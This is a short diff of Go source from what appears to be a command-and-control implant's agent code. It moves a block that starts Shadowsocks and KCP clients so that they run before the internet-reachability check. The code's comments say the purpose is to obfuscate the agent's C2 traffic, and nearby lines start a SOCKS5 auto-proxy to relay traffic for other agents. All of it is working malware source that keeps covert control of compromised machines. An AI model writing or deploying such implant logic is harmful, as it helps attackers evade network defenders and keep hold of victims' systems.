@@ -312,6 +312,17 @@ test_agent:
 		}
 	}
 
+	// enable shadowsocks / kcp
+	if agent.RuntimeConfig.UseShadowsocks {
+		// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
+		agent.RuntimeConfig.C2TransportProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
+			agent.RuntimeConfig.ShadowsocksPort)
+
+		// run ss w/wo KCP
+		go agent.ShadowsocksC2Client()
+		go agent.KCPClient() // KCP client will run when UseKCP is set
+	}
+
 	// do we have internet?
 	checkInternet := func(cnt *int) bool {
 		if isC2Reachable() {
@@ -320,16 +331,6 @@ test_agent:
 				log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
 				ctx, cancel := context.WithCancel(context.Background())
 				go agent.StartBroadcast(true, ctx, cancel) // auto-proxy feature
-
-				if agent.RuntimeConfig.UseShadowsocks {
-					// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
-					agent.RuntimeConfig.C2TransportProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
-						agent.RuntimeConfig.ShadowsocksPort)
-
-					// run ss w/wo KCP
-					go agent.ShadowsocksC2Client()
-					go agent.KCPClient() // KCP client will run when UseKCP is set
-				}
 			}
 			return true
 
